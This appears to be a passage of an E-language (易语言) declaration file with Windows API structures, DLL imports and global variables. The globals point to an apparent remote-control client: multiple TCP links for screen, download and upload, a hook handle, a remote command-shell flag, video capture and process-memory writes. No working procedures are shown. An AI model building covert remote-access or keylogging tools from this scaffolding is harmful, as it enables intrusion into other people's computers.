    .成员 鼠标左键被按下, 子程序指针, , , 
    .成员 鼠标左键被放开, 子程序指针, , , 
    .成员 被双击, 子程序指针, , , 
    .成员 鼠标右键被按下, 子程序指针, , , 
    .成员 鼠标右键被放开, 子程序指针, , , 
    .成员 鼠标位置被移动, 子程序指针, , , 
    .成员 获取焦点, 子程序指针, , , 
    .成员 失去焦点, 子程序指针, , , 
    .成员 按下某键, 子程序指针, , , 
    .成员 放开某键, 子程序指针, , , 
    .成员 字符输入, 子程序指针, , , 
    .成员 匿名成员7645, 空白型, , , 
    .成员 尺寸被改变, 子程序指针, , , 
    .成员 创建完毕, 子程序指针, , , 
    .成员 将被销毁, 子程序指针, , , 

数据类型 窗口函数, , 
    .成员 窗口句柄, 整数型, , , 
    .成员 窗口函数, 整数型, , , 

数据类型 WNDCLASSEX, , 窗口类
    .成员 cbSize, 整数型, , , 结构字节数
    .成员 style, 整数型, , , 类风格
    .成员 lpfnWndProc, 整数型, , , 窗口过程地址
    .成员 cbClsExtra, 整数型, , , 窗口预留空间
    .成员 cbWndExtra, 整数型, , , 结构预留空间
    .成员 hInstance, 整数型, , , 窗口属于的模块句柄
    .成员 hIcon, 整数型, , , 图标句柄
    .成员 hCursor, 整数型, , , 光标句柄
    .成员 hbrBackground, 整数型, , , 窗口背景色
    .成员 lpszMenuName, 文本型, , , 默认菜单
    .成员 lpszClassName, 文本型, , , 窗口类名称
    .成员 hIconSm, 整数型, , , 小图标句柄

数据类型 RECT, , 
    .成员 左, 整数型, , , 
    .成员 顶, 整数型, , , 
    .成员 右, 整数型, , , 
    .成员 底, 整数型, , , 

数据类型 BITMAPINFO1, , 
    .成员 BITMAPINFOHEADER, BITMAPINFOHEADER, , , 
    .成员 bmiColors, 整数型, , , 

数据类型 BITMAPINFO, , 
    .成员 bmiHeader, BITMAPINFOHEADER, , , 
    .成员 bmiColors, 整数型, , "255", 

数据类型 BITMAP, , 
    .成员 bmType, 整数型, , , 
    .成员 bmWidth, 整数型, , , 
    .成员 bmHeight, 整数型, , , 
    .成员 bmWidthBytes, 整数型, , , 
    .成员 bmPlanes, 短整数型, , , 
    .成员 bmBitsPixel, 短整数型, , , 
    .成员 bmBits, 整数型, 传址, , 

数据类型 BITMAPINFOHEADER, , 设备无关位图;
    .成员 biSize, 整数型, , , 40
    .成员 biWidth, 整数型, , , btm.bmWidth
    .成员 biHeight, 整数型, , , btm.bmHeight
    .成员 biPlanes, 短整数型, , , 1
    .成员 biBitCount, 短整数型, , , btm.bmBitsPixel
    .成员 biCompression, 整数型, , , 0
    .成员 biSizeImage, 整数型, , , (btm.bmWidth*24+31)/8*btm.bmHeight
    .成员 biXPelsPerMeter, 整数型, , , 0
    .成员 biYPelsPerMeter, 整数型, , , 0
    .成员 biClrUsed, 整数型, , , 0 24色取0
    .成员 biClrImportant, 整数型, , , 0

数据类型 位图结构_, , 
    .成员 bmType, 整数型, , , 一定是0
    .成员 位图宽度, 整数型, , , bmWidth
    .成员 位图高度, 整数型, , , bmHeight
    .成员 bmWidthBytes, 整数型, , , 
    .成员 bmPlanes, 整数型, , , 
    .成员 bmBitsPixel, 整数型, , , 
    .成员 bmBits, 整数型, , , 

数据类型 多线程许可证, 公开, 
    .成员 DebugInfo, 整数型, , , 
    .成员 LockCount, 整数型, , , 
    .成员 RecursionCount, 整数型, , , 
    .成员 OwningThread, 整数型, , , 
    .成员 LockSemaphore, 整数型, , , 
    .成员 SpinCount, 整数型, , , 

数据类型 鼠标坐标, 公开, POINTAPI,GetCursorPos
    .成员 横向位置, 整数型, , , x，横向位置
    .成员 纵向位置, 整数型, , , y，纵向位置

数据类型 键名数据, 公开, 
    .成员 键名, 文本型, , , 
    .成员 类型, 整数型, , , 

数据类型 重叠操作_, 公开, OVERLAPPED
    .成员 内部保留参数, 整数型, , , Internal
    .成员 内部高位保留参数, 整数型, , , InternalHigh
    .成员 低32位, 整数型, , , offset
    .成员 高32位, 整数型, , , offsethigh
    .成员 事件句柄, 整数型, , , hevent

数据类型 内存结构, 公开, 
    .成员 进程ID, 整数型, , , 
    .成员 内存地址, 整数型, , , 
    .成员 欲写入值, 整数型, , , 

数据类型 SERVICE_STATUS, 公开, 
    .成员 dwServiceType, 整数型, , , 
    .成员 dwCurrentState, 整数型, , , 
    .成员 dwControlsAccepted, 整数型, , , 
    .成员 dwWin32ExitCode, 整数型, , , 
    .成员 dwServiceSpecificExitCode, 整数型, , , 
    .成员 dwCheckPoint, 整数型, , , 
    .成员 dwWaitHint, 整数型, , , 

数据类型 MD5_CTX, 公开, MD5_CTX数据类型
    .成员 i, 整数型, , "2", 
    .成员 buf, 整数型, , "4", 
    .成员 in, 字节型, , "64", 
    .成员 digest, 字节型, , "16", 编码

数据类型 虚拟信息, , MEMORY_BASIC_INFORMATION
    .成员 BaseAddress, 整数型, , , 
    .成员 AllocationBase, 整数型, , , 
    .成员 AllocationProtect, 整数型, , , 
    .成员 RegionSize, 整数型, , , 
    .成员 State, 整数型, , , 
    .成员 Protect, 整数型, , , 
    .成员 lType, 整数型, , , 

数据类型 窗口信息, 公开, 枚举窗口信息
    .成员 窗口句柄, 整数型, 传址, , 
    .成员 进程ID, 整数型, 传址, , 
    .成员 线程ID, 整数型, 传址, , 
    .成员 窗口类名, 文本型, 传址, , 
    .成员 窗口标题, 文本型, 传址, , 

数据类型 SHFILEOPSTRUCT, 公开, 
    .成员 句柄, 整数型, , , 
    .成员 wFunc, 整数型, , , 
    .成员 pFrom, 字节集, , , 
    .成员 pTo, 字节集, , , 
    .成员 fFlags, 短整数型, , , 
    .成员 fAnyOperationsAborted, 整数型, , , 
    .成员 hNameMappings, 整数型, , , 
    .成员 lpszProgressTitle, 文本型, , , 

数据类型 SHQUERYRBINFO, 公开, 
    .成员 结构大小, 整数型, , , 
    .成员 文件长度, 长整数型, , , 
    .成员 文件数, 长整数型, , , 

数据类型 磁盘信息_, 公开, 
    .成员 盘符, 文本型, , , 
    .成员 卷标, 文本型, , , 
    .成员 序列号, 整数型, , , 
    .成员 文件系统名称, 文本型, , , 如FAT，NTFS等。
    .成员 驱动器类型, 整数型, , , 
    .成员 磁盘总空间, 长整数型, , , 单位为字节。
    .成员 磁盘已用空间, 长整数型, , , 单位为字节。
    .成员 磁盘剩余空间, 长整数型, , , 单位为字节。

数据类型 SHITEMID, 公开, 
    .成员 cb, 整数型, , , 
    .成员 abID, 字节型, , , 

数据类型 ITEMIDLIST, 公开, 
    .成员 mkid, SHITEMID, , , 

数据类型 BROWSEINFO, , 
    .成员 hOwner, 整数型, , , 
    .成员 pidlRoot, 整数型, , , 
    .成员 pszDisplayName, 文本型, , , 
    .成员 lpszTitle, 文本型, , , 
    .成员 ulFlags, 整数型, , , 
    .成员 lpfn, 整数型, , , 
    .成员 lParam, 整数型, , , 
    .成员 iImage, 整数型, , , 

数据类型 系统时间, 公开, 
    .成员 年, 短整数型, , , 
    .成员 月, 短整数型, , , 
    .成员 星期, 短整数型, , , 
    .成员 日, 短整数型, , , 
    .成员 时, 短整数型, , , 
    .成员 分, 短整数型, , , 
    .成员 秒, 短整数型, , , 
    .成员 毫秒, 短整数型, , , 

数据类型 项目标识符列表_, 公开, ITEMIDLIST
    .成员 结构大小, 整数型, , , cb
    .成员 标识符长度, 字节型, , "255", abID

数据类型 FILETIME, , 
    .成员 dwLowDateTime, 整数型, , , 
    .成员 dwHighDateTime, 整数型, , , 

数据类型 文件结构信息_, 公开, $(a)OFSTRUCT
    .成员 结构长度, 字节型, , , cBytes,设置成结构的长度（目前是136）
    .成员 文件盘符, 字节型, , , fFixedDisk,参见相关帮助
    .成员 错误代码, 整数型, , , nErrCode，参见相关帮助
    .成员 保留1, 整数型, , , Reserved1,保留不用
    .成员 保留2, 整数型, , , Reserved2,保留不用
    .成员 文件路径, 文本型, , "128", szPathName,文件的完整路径名

数据类型 进程信息_, 公开, MODULEENTRY32
    .成员 结构大小, 整数型, , , dwSize  一般填写548
    .成员 模块标识符, 整数型, , , th32ModuleID
    .成员 进程标识符, 整数型, , , th32ProcessID
    .成员 模块数, 整数型, , , GlblcntUsage
    .成员 进程数, 整数型, , , ProccntUsage
    .成员 模块基址, 整数型, , , modBaseAddr
    .成员 模块基址大小, 整数型, , , modBaseSize
    .成员 模块句柄, 整数型, , , hModule
    .成员 模块名称, 字节型, , "256", szModule
    .成员 文件路径, 字节型, , "260", szExePath

数据类型 创建进程返回数据类型, 公开, PROCESS_INFORMATION
    .成员 进程句柄, 整数型, , , hProcess
    .成员 主线程句柄, 整数型, , , hThread
    .成员 进程ID, 整数型, , , dwProcessId
    .成员 主线程ID, 整数型, , , dwThreadId

数据类型 启动信息数据, 公开, STARTUPINFO
    .成员 结构长度, 整数型, , , cb
    .成员 lpReserved, 整数型, , , lpReserved
    .成员 lpDesktop, 整数型, , , lpDesktop
    .成员 lpTitle, 整数型, , , lpTitle
    .成员 窗口位置X, 整数型, , , dwX
    .成员 窗口位置Y, 整数型, , , dwY
    .成员 宽度, 整数型, , , dwXSize
    .成员 高度, 整数型, , , dwYSize
    .成员 dwXCountChars, 整数型, , , dwXCountChars
    .成员 dwYCountChars, 整数型, , , dwYCountChars
    .成员 dwFillAttribute, 整数型, , , dwFillAttribute
    .成员 标记, 整数型, , , dwFlags
    .成员 ShowWindow, 整数型, , , ShowWindo标记
    .成员 cbReserved2, 整数型, , , cbReserved2
    .成员 lpReserved2, 整数型, , , lpReserved2
    .成员 hStdInput, 整数型, , , hStdInput
    .成员 hStdOutput, 整数型, , , hStdOutput
    .成员 hStdError, 整数型, , , hStdError

数据类型 LuID, 公开, 
    .成员 lowpart, 整数型, , , 
    .成员 highpart, 整数型, , , 

数据类型 空闲时间, 公开, 取空闲时间
    .成员 Size, 空白型, , , 结构大小
    .成员 Time, 空白型, , , 

数据类型 进程权限, 公开, From:AdjustTokenPrivileges
    .成员 PrivilegeCount, 整数型, , , 
    .成员 lowpart, 整数型, , , 
    .成员 highpart, 整数型, , , 
    .成员 Attributes, 整数型, , , 

数据类型 OSVERSIONINFO, 公开, 
    .成员 dwOSVersionInfoSize, 整数型, , , 
    .成员 dwMajorVersion, 整数型, , , 
    .成员 dwMinorVersion, 整数型, , , 
    .成员 dwBuildNumber, 整数型, , , 
    .成员 dwPlatformId, 整数型, , , 
    .成员 szCSDVersion, 字节型, , "128", 

数据类型 WSADATA, 公开, 
    .成员 wVersion, 短整数型, , , 
    .成员 wHighVersion, 短整数型, , , 
    .成员 szDescription, 字节型, , "257", 
    .成员 szSystemStatus, 字节型, , "129", 
    .成员 imaxsockets, 短整数型, , , 
    .成员 imaxudp, 短整数型, , , 
    .成员 lpszvenderinfo, 整数型, , , 

数据类型 HOSTENT, 公开, 
    .成员 hName, 整数型, , , 
    .成员 hAliases, 整数型, , , 
    .成员 hAddrType, 短整数型, , , 
    .成员 hLen, 短整数型, , , 
    .成员 hAddrList, 整数型, , , 

数据类型 WIN32_FIND_DATA, , 
    .成员 dwFileAttributes, 整数型, , , 
    .成员 ftCreationTime, FILETIME, , , 
    .成员 ftLastAccessTime, FILETIME, , , 
    .成员 ftLastWriteTime, FILETIME, , , 
    .成员 nFileSizeHigh, 整数型, , , 
    .成员 nFileSizeLow, 整数型, , , 
    .成员 dwReserved0, 整数型, , , 
    .成员 dwReserved1, 整数型, , , 
    .成员 cFileName, 字节型, , "260", 
    .成员 cAlternate, 字节型, , "14", 

数据类型 MSG, , 
    .成员 message, 整数型, , , 
    .成员 paramL, 整数型, , , 
    .成员 paramH, 整数型, , , 
    .成员 time, 整数型, , , 
    .成员 hwnd, 整数型, , , 
    .成员 匿名成员7984, 空白型, , , 
    .成员 wParam, 整数型, , , 
    .成员 lParam, 整数型, , , 
    .成员 pt, POINTAPI, , , 

数据类型 坐标型, 公开, 
    .成员 x, 整数型, , , X轴坐标
    .成员 y, 整数型, , , Y轴坐标

数据类型 鼠标输入_, , MOUSEINPUT
    .成员 类型, 整数型, , , DWORD type 传0
    .成员 坐标, 坐标型, , , 
    .成员 鼠标数据, 整数型, , , DWORD mouseData
    .成员 鼠标动作, 整数型, , , DWORD dwFlags #MOUSEEVENTF_
    .成员 时间, 整数型, , , DWORD time
    .成员 扩展信息, 整数型, , , DWORD dwExtraInfo

数据类型 键盘输入_, , ki
    .成员 类型, 整数型, , , DWORD type 传1
    .成员 虚拟键码, 短整数型, , , 虚拟键码
    .成员 扫描码, 短整数型, , , 扫描码
    .成员 键盘动作, 整数型, , , DWORD dwFlags 0=按下,2=放开 #KEYEVENTF_
    .成员 时间, 整数型, , , DWORD time
    .成员 扩展信息, 整数型, , , DWORD dwExtraInfo
    .成员 保留, 整数型, , "2", 

数据类型 WAVEFORMATEX, , 
    .成员 格式, 短整数型, , , 
    .成员 声道, 短整数型, , , 
    .成员 采样率, 整数型, , , 
    .成员 数据量, 整数型, , , 
    .成员 对齐单位, 短整数型, , , 
    .成员 位数, 短整数型, , , 
    .成员 长度, 短整数型, , , 

数据类型 WAVEHDR, , 
    .成员 缓冲指针, 整数型, , , 
    .成员 缓冲大小, 整数型, , , 
    .成员 dwBytesRecorded, 整数型, , , 
    .成员 dwUser, 整数型, , , 
    .成员 dwFlags, 整数型, , , 
    .成员 dwLoops, 整数型, , , 
    .成员 lpNext, 整数型, , , 
    .成员 Reserved, 整数型, , , 

数据类型 BITMAPFILEHEADER, , 
    .成员 bfType, 短整数型, , , 
    .成员 bfSize, 整数型, , , 
    .成员 bfReserved1, 短整数型, , , 
    .成员 bfReserved2, 短整数型, , , 
    .成员 bfOffBits, 整数型, , , 

数据类型 SCROLLINFO, , 
    .成员 cbSize, 整数型, , , 
    .成员 fMask, 整数型, , , 
    .成员 nMin, 整数型, , , 
    .成员 nMax, 整数型, , , 
    .成员 nPage, 整数型, , , 
    .成员 nPos, 整数型, , , 
    .成员 nTrackPos, 整数型, , , 

数据类型 服务状态, , 
    .成员 dwServiceType, 整数型, , , 
    .成员 dwCurrentState, 整数型, , , 
    .成员 dwControlsAccepted, 整数型, , , 
    .成员 dwWin32ExitCode, 整数型, , , 
    .成员 dwServiceSpecificExitCode, 整数型, , , 
    .成员 dwCheckPoint, 整数型, , , 
    .成员 dwWaitHint, 整数型, , , 

数据类型 ENUM_SERVICE_STATUS_PROCESS, , 
    .成员 lpServiceName, 文本型, , , 
    .成员 lpDisplayName, 文本型, , , 
    .成员 dwServiceType, 整数型, , , SERVICE_STATUS_PROCESS
    .成员 dwCurrentState, 整数型, , , 
    .成员 dwControlsAccepted, 整数型, , , 
    .成员 dwWin32ExitCode, 整数型, , , 
    .成员 dwServiceSpecificExitCode, 整数型, , , 
    .成员 dwCheckPoint, 整数型, , , 
    .成员 dwWaitHint, 整数型, , , 
    .成员 dwProcessId, 整数型, , , 
    .成员 dwServiceFlags, 整数型, , , 

数据类型 模块信息, , 
    .成员 size, 整数型, , , 
    .成员 mid, 整数型, , , 
    .成员 pid, 整数型, , , 
    .成员 gusage, 整数型, , , 
    .成员 pusage, 整数型, , , 
    .成员 base, 整数型, , , 
    .成员 bsize, 整数型, , , 
    .成员 hmodule, 整数型, , , 
    .成员 szname, 字节型, , "256", 
    .成员 szpath, 字节型, , "256", 

数据类型 进程结构, 公开, 
    .成员 结构长度, 整数型, , , 296字节
    .成员 引用计数, 整数型, , , 
    .成员 进程ID, 整数型, , , 
    .成员 默认堆ID, 整数型, , , 
    .成员 模块ID, 整数型, , , 
    .成员 线程数, 整数型, , , 
    .成员 父进程ID, 整数型, , , 
    .成员 线程优先级, 整数型, , , 
    .成员 保留, 整数型, , , 
    .成员 进程名, 字节型, , "256", 

数据类型 临时总数据类型, , 
    .成员 地址, 整数型, , , 
    .成员 数据, 内存申请, , , 

数据类型 沾包头处理数据类型, , 
    .成员 地址, 整数型, , , 
    .成员 字节集, 字节集, , , 

数据类型 OSVERSIONINFOEX, , 
    .成员 dwOSVersionInfoSize, 整数型, , , 
    .成员 dwMajorVersion, 整数型, , , 
    .成员 dwMinorVersion, 整数型, , , 
    .成员 dwBuildNumber, 整数型, , , 
    .成员 dwPlatformId, 整数型, , , 
    .成员 szCSDVersion, 字节型, , "128", 
    .成员 wServicePackMajor, 短整数型, , , 
    .成员 wServicePackMinor, 短整数型, , , 
    .成员 wSuiteMask, 短整数型, , , 
    .成员 wProductType, 字节型, , , 
    .成员 wReserved, 字节型, , , 

数据类型 低层平台信息系统信息, 公开, SYSTEM_INFO
    .成员 dwOemID, 整数型, , , 
    .成员 dwPageSize, 整数型, , , 
    .成员 lpMinimumApplicationAddress, 整数型, , , 
    .成员 lpMaximumApplicationAddress, 整数型, , , 
    .成员 dwActiveProcessorMask, 整数型, , , 
    .成员 dwNumberOrfProcessors, 整数型, , , 
    .成员 dwProcessorType, 整数型, , , 
    .成员 dwAllocationGranularity, 整数型, , , 
    .成员 dwReserved, 整数型, , , 

数据类型 内存状态_, , MEMORYSTATUS
    .成员 结构长度, 整数型, , , dwLength
    .成员 实际存储器百分比, 整数型, , , dwMemoryLoad
    .成员 总物理内存, 整数型, , , dwTotalPhys
    .成员 可用物理内存, 整数型, , , dwAvailPhys
    .成员 总页文件, 整数型, , , dwTotalPageFile
    .成员 可用页文件, 整数型, , , dwAvailPageFile
    .成员 总虚拟内存, 整数型, , , dwTotalVirtual
    .成员 可用虚拟内存, 整数型, , , dwAvailVirtual

数据类型 d安全性结构_, , 
    .成员 nLength, 整数型, , , 
    .成员 lpSecurityDescriptor, 整数型, , , 
    .成员 bInheritHandle, 整数型, , , 

数据类型 安全属性, , SECURITY_ATTRIBUTES
    .成员 长度, 整数型, , , 
    .成员 权限, 整数型, , , 
    .成员 句柄, 整数型, , , 

数据类型 进程信息, , 
    .成员 进程号, 整数型, , , 
    .成员 线程号, 整数型, , , 
    .成员 进程ID, 整数型, , , 
    .成员 线程ID, 整数型, , , 

数据类型 SYSTEM_INFO, , 
    .成员 dwOemId, dwOemId, , , 
    .成员 dwPageSize, 整数型, , , 
    .成员 lpMinimumApplicationAddress, 整数型, , , 
    .成员 lpMaximumApplicationAddress, 整数型, , , 
    .成员 dwActiveProcessorMask, 整数型, 传址, , 
    .成员 dwNumberOfProcessors, 整数型, , , 
    .成员 dwProcessorType, 整数型, , , 
    .成员 dwAllocationGranularity, 整数型, , , 
    .成员 wProcessorLevel, 短整数型, , , 
    .成员 wProcessorRevision, 短整数型, , , 

数据类型 dwOemId, , 
    .成员 wProcessorArchitecture, 短整数型, , , 
    .成员 wReserved, 短整数型, , , 

数据类型 WSADATA1, , 
    .成员 wVersion, 短整数型, , , 
    .成员 lpVendorInfo, 短整数型, , , 
    .成员 szDescription, 字节型, , "257", 
    .成员 szSystemStatus, 字节型, , "129", 
    .成员 wMaxSockets, 整数型, , , 
    .成员 wMaxUDPDG, 整数型, , , 
    .成员 dwVendorInfo, 字节型, , , 

数据类型 sockaddr_in, , 
    .成员 sin_family, 短整数型, , , 
    .成员 sin_port, 短整数型, , , 
    .成员 sin_addr, 整数型, , , 
    .成员 sin_zero, 字节型, , "8", 

数据类型 启动信息, , 
    .成员 cb, 整数型, , , 
    .成员 lpReserved, 整数型, , , 
    .成员 lpDesktop, 整数型, , , 
    .成员 lpTitle, 整数型, , , 
    .成员 dwX, 整数型, , , 
    .成员 dwY, 整数型, , , 
    .成员 dwXSize, 整数型, , , 
    .成员 dwYSize, 整数型, , , 
    .成员 dwXCountChars, 整数型, , , 
    .成员 dwYCountChars, 整数型, , , 
    .成员 dwFillAttribute, 整数型, , , 
    .成员 dwFlags, 整数型, , , 
    .成员 wShowWindow, 短整数型, , , 
    .成员 cbReserved2, 短整数型, , , 
    .成员 lpReserved2, 整数型, , , 
    .成员 hStdInput, 整数型, , , 
    .成员 hStdOutput, 整数型, , , 
    .成员 hStdError, 整数型, , , 

数据类型 矩形, , 矩形;
    .成员 左边, 整数型, , , 
    .成员 顶边, 整数型, , , 
    .成员 右边, 整数型, , , 
    .成员 底边, 整数型, , , 

数据类型 坐标, , 
    .成员 x, 整数型, , , 
    .成员 y, 整数型, , , 

数据类型 文件头信息_, , 
    .成员 文件类型, 短整数型, , , bfType
    .成员 结果大小, 整数型, , , bfSize
    .成员 保留1, 短整数型, , , bfReserved1保留，必须设置为0
    .成员 保留2, 短整数型, , , bfReserved2保留，必须设置为0
    .成员 偏移量, 空白型, , , bfOffBits从文件头开始到实际的图象数据之间的字节的偏移量

数据类型 LPMEMORYSTATUSEX, , , MEMORYSTATUS
    .成员 dwLength, 整数型, , , 
    .成员 dwMemoryLoad, 整数型, , , 使用率0-100
    .成员 ullTotalPhys, 长整数型, , , 
    .成员 ullAvailPhys, 长整数型, , , 
    .成员 ullTotalPageFile, 长整数型, , , 
    .成员 ullAvailPageFile, 长整数型, , , 
    .成员 ullTotalVirtual, 长整数型, , , 
    .成员 ullAvailVirtual, 长整数型, , , 
    .成员 ullAvailExtendedVirtual, 长整数型, , , 0

数据类型 矩形区域, 公开, 
    .成员 左边, 整数型, , , 
    .成员 顶边, 整数型, , , 
    .成员 右边, 整数型, , , 
    .成员 底边, 整数型, , , 

数据类型 项目, , 
    .成员 发送, 逻辑型, , , 
    .成员 本地路径, 文本型, , , 
    .成员 大小, 长整数型, , , 

数据类型 下载项目a, 公开, 
    .成员 保存位置, 文本型, , , 
    .成员 当前保存位置, 整数型, , , 
    .成员 修改时间, 日期时间型, , , 
    .成员 总长度, 长整数型, , , 
    .成员 已下载长度, 长整数型, , , 
    .成员 耗时, 整数型, , , 
    .成员 下载开始时间, 整数型, , , 
    .成员 线程数, 整数型, , , 
    .成员 当前线程数, 整数型, , , 
    .成员 线程组, 下载线程, , , 

数据类型 下载线程, 公开, 
    .成员 是否退出, 逻辑型, , , 
    .成员 事件对象句柄, 整数型, , , 
    .成员 下载长度, 整数型, , , 
    .成员 已下载, 整数型, , , 
    .成员 起始位置, 整数型, , , 
    .成员 数据, 字节集, , , 
    .成员 已写入磁盘大小, 整数型, , , 

数据类型 sokt, 公开, 
    .成员 协议类型, 短整数型, , , 
    .成员 端口, 短整数型, , , 
    .成员 IP, 整数型, , , 
    .成员 结构大小, 字节型, , "8", 

数据类型 下载信息, 公开, 
    .成员 已下载, 整数型, , , 
    .成员 耗时, 整数型, , , 
    .成员 速度, 整数型, , , 
    .成员 进度, 整数型, , , 

.全局变量 连接否, 空白型, , , 0=未连接 1=已连接 2=已上线
.全局变量 IP端口, 文本型, , , 
.全局变量 IP, 文本型, , , 
.全局变量 端口, 空白型, , , 
.全局变量 传输端口, 空白型, , , 
.全局变量 TCP客户端, TCP客户端, , "11", 1为主连接 2屏幕连接 3下载 4上传
.全局变量 分割符, 字节集, , , 10位的字节集
.全局变量 总数据, 临时总数据类型, , "0", 
.全局变量 自己的地址, 字节集, , , 
.全局变量 匿名全局变量_57, 空白型, , , 
.全局变量 屏幕裁图许可证, 多线程许可证, , , '屏幕控制
.全局变量 颜色表8位, 字节集, , , '屏幕控制
.全局变量 屏幕连接句柄, 字节集, , , '屏幕控制
.全局变量 匿名全局变量_2300, 空白型, , , 
.全局变量 声音, 字节集, , , 声音
.全局变量 匿名全局变量_2757, 空白型, , , 
.全局变量 记录钩子句柄, 整数型, , , 
.全局变量 匿名全局变量_3229, 空白型, , , 
.全局变量 连接DOS, 逻辑型, , , 
.全局变量 停止搜索, 整数型, , , 文件搜索 0 = 允许搜索
.全局变量 搜索到的文件, 文本型, , , 
.全局变量 匿名全局变量_6949, 空白型, , , 
.全局变量 视频状态, 空白型, , , 0=未创建 1=已创建 2=停止
.全局变量 窗口句柄_, 整数型, , , 
.全局变量 捕获窗口句柄, 空白型, , , 
.全局变量 匿名全局变量_9927, 空白型, , , 
.全局变量 已运行数据, 运行的数据类型, , , 
.全局变量 匿名全局变量_10653, 空白型, , , 
.全局变量 屏幕场景, 整数型, , , 
.全局变量 差异屏幕线程, 空白型, , , 0=停止 1=启动
.全局变量 连接, 空白型, , , 
.全局变量 进入的客户, 空白型, , , 
.全局变量 匿名全局变量_11295, 空白型, , , 
.全局变量 全局_窗口句柄, 空白型, , , 

.DLL命令 GetObjectA, 整数型, "", "GetObjectA", , 
    .参数 hgdiobj, 空白型, , 
    .参数 cbBuffer, 空白型, , 
    .参数 lpvObject, BITMAP, , 

.DLL命令 PrintWindow, 逻辑型, "", "", , 
    .参数 hwnd, 整数型, , 
    .参数 hdcBlt, 整数型, , 
    .参数 nFlags, 整数型, , 

.DLL命令 CreateCompatibleBitmap, 整数型, "", "CreateCompatibleBitmap", , 
    .参数 hdc, 空白型, , 
    .参数 nWidth, 空白型, , 
    .参数 nHeight, 空白型, , 

.DLL命令 InitializeCriticalSection, 空白型, "kernel32", "", , 创建许可证
    .参数 lpCriticalSection, 多线程许可证, 传址, 

.DLL命令 DeleteCriticalSection, 空白型, "kernel32", "", , 删除许可证
    .参数 lpCriticalSection, 多线程许可证, 传址, 

.DLL命令 EnterCriticalSection, 空白型, "kernel32", "", , 进入许可区
    .参数 lpCriticalSection, 多线程许可证, 传址, 

.DLL命令 LeaveCriticalSection, 空白型, "kernel32", "", , 退出许可区
    .参数 lpCriticalSection, 多线程许可证, 传址, 

.DLL命令 CreateThread, 整数型, "kernel32", "", , 启动线程
    .参数 lpThreadAttributes, 整数型, , 
    .参数 dwStackSize, 整数型, , 
    .参数 lpStartAddress, 子程序指针, , 
    .参数 lpParameter, 整数型, , 
    .参数 dwCreationFlags, 整数型, , 
    .参数 lpThreadId, 整数型, 传址, 

.DLL命令 CloseHandle, 整数型, "kernel32", "CloseHandle", , 
    .参数 hObject, 整数型, , 

.DLL命令 WaitForSingleObject, 整数型, "kernel32", "WaitForSingleObject", , 监测一个对象
    .参数 hHandle, 整数型, , 
    .参数 dwMilliseconds, 整数型, , 

.DLL命令 SuspendThread, 整数型, "kernel32", "SuspendThread", , 挂起线索
    .参数 hThread, 整数型, , 

.DLL命令 TerminateThread, 整数型, "kernel32", "TerminateThread", , 中止线索
    .参数 hThread, 整数型, , 
    .参数 dwExitCode, 整数型, , 

.DLL命令 ResumeThread, 整数型, "kernel32", "ResumeThread", , 开始暂停的线索
    .参数 hThread, 整数型, , 

.DLL命令 GetExitCodeThread, 整数型, "kernel32", "GetExitCodeThread", , 
    .参数 hThread, 整数型, , 
    .参数 lpExitCode, 整数型, 传址, 

.DLL命令 TerminateProcess1, 逻辑型, "kernel32.dll", "TerminateProcess", 公开, 结束一个进程 Long，非零表示成功，零表示失败。会设置GetLastError
    .参数 进程句柄, 整数型, , hProcess Long，指定要中断的一个进程的句柄
    .参数 退出代码, 整数型, , uExitCode Long，进程的一个退出代码

.DLL命令 Module32First1, 整数型, "kernel32.dll", "Module32First", 公开, Module32First  返回模块数目
    .参数 快照句柄, 整数型, , hSnapshot
    .参数 模块进程结构, 模块信息, 传址, uProcess

.DLL命令 Sleep, 整数型, "kernel32.dll", "Sleep", 公开, , Sleep
    .参数 延迟毫秒数, 整数型, , 毫秒

.DLL命令 MessageBoxA, 整数型, "", "MessageBoxA", 公开, 
    .参数 窗口句柄, 整数型, , 
    .参数 提示信息, 文本型, , 
    .参数 窗口标题, 文本型, , 
    .参数 按钮值, 整数型, , 

.DLL命令 GetActiveWindow, 整数型, "user32.dll", "GetActiveWindow", 公开, 获得活动窗口的句柄  活动窗口的句柄，如没有窗口处于活动状态，则返回零值

.DLL命令 LocalAlloc, 整数型, "", "LocalAlloc", 公开, 
    .参数 uFlags, 整数型, , 
    .参数 uBytes, 整数型, , 

.DLL命令 RtlMoveMemory_读文本, 整数型, "kernel32.dll", "RtlMoveMemory", 公开, 
    .参数 目标数据, 文本型, 传址, 
    .参数 原数据, 整数型, , 
    .参数 尺寸, 整数型, , 

.DLL命令 RtlMoveMemory_读整数, 整数型, "kernel32.dll", "RtlMoveMemory", 公开, 
    .参数 目标数据, 整数型, 传址, 
    .参数 原数据, 整数型, , 
    .参数 尺寸, 整数型, , 

.DLL命令 RtlMoveMemory_读字节集, 整数型, "kernel32.dll", "RtlMoveMemory", 公开, 
    .参数 目标数据, 字节集, 传址, 
    .参数 原数据, 整数型, , 
    .参数 尺寸, 整数型, , 

.DLL命令 RtlMoveMemory_读字节, 整数型, "kernel32.dll", "RtlMoveMemory", 公开, 
    .参数 目标数据, 字节型, 传址, 
    .参数 原数据, 整数型, , 
    .参数 尺寸, 整数型, , 

.DLL命令 CharLowerA, 文本型, "", "CharLowerA", 公开, CharUpperA 将文本中的大写英文字母变换为小写，返回变换后的结果文本。
    .参数 欲变换的文本, 文本型, , 

.DLL命令 CharUpperA, 文本型, "", "CharUpperA", 公开, CharUpperA 将文本中的小写英文字母变换为大写，返回变换后的结果文本。
    .参数 欲变换的文本, 文本型, , 

.DLL命令 RtlFillMemory_字节, 空白型, "kernel32.dll", "RtlFillMemory", 公开, 
    .参数 指针地址, 整数型, , 指针地址
    .参数 长度, 整数型, , 长度
    .参数 写入数据, 字节型, , 

.DLL命令 RtlFillMemory_字节集, 空白型, "kernel32.dll", "RtlFillMemory", 公开, 
    .参数 指针地址, 整数型, , 指针地址
    .参数 长度, 整数型, , 长度
    .参数 写入数据, 字节集, , 

.DLL命令 RtlFillMemory_文本, 空白型, "kernel32.dll", "RtlFillMemory", 公开, 
    .参数 指针地址, 整数型, , 指针地址
    .参数 长度, 整数型, , 长度
    .参数 写入数据, 文本型, , 

.DLL命令 RtlFillMemory_整数, 空白型, "kernel32.dll", "RtlFillMemory", 公开, 
    .参数 指针地址, 整数型, , 指针地址
    .参数 长度, 整数型, , 长度
    .参数 写入数据, 整数型, , 

.DLL命令 lstrcpyn_内存结构, 整数型, "kernel32.dll", "lstrcpyn", 公开, 取内存变量地址2_,
    .参数 数据1, 内存结构, 传址, lpString1
    .参数 数据2, 内存结构, 传址, lpString2
    .参数 数据长度, 整数型, , iMaxLength

